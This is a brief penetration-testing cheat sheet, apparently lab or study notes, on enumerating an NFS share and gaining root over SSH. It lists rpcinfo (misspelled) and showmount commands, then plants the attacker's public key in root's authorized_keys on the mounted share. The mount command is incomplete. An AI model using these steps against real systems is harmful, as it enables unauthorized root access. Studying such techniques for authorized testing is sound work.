# NFS Enumeration
- Network file system

## Exploiting NFS

1. Use rcpinfo to determine the services running
`rcpinfo -p 192.168.1.1`

2. Use showmount to which directories you have access to mount.
`showmount -e 192.168.1.1`


3. Create and mount the remote directory
```sh
mkdir /mnt/nfs
mount /mnt/nfs
```

4. We notice that SSH is open, so we'll exploit that service. '
```sh
ssh-keygen
cat ~/.ssh/id_rsa.pub >> /mnt/nfs/root/.ssh/authorized_keys
```

5. At this point we can ssh into the system as the root user.
```sh
ssh root@192.168.1.1
```
